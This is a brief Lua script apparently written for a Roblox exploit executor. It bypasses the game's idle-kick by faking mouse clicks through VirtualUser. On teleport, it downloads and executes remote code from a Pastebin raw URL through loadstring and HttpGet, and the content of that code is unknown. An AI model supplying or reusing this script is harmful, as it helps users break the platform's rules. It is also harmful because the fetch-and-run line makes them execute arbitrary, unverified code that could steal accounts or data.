local vu = cloneref(game:GetService("VirtualUser"))
local plr = game:GetService("Players").LocalPlayer
plr.Idled:connect(function()
	vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
	task.wait(1)
	vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)

plr.OnTeleport:Connect(function(State)
	if State == Enum.TeleportState.Started then
		loadstring(game:HttpGet("https://pastebin.com/raw/ReqaZ3Hs"))()
	end
end)

queue_on_teleport([[
	
]])
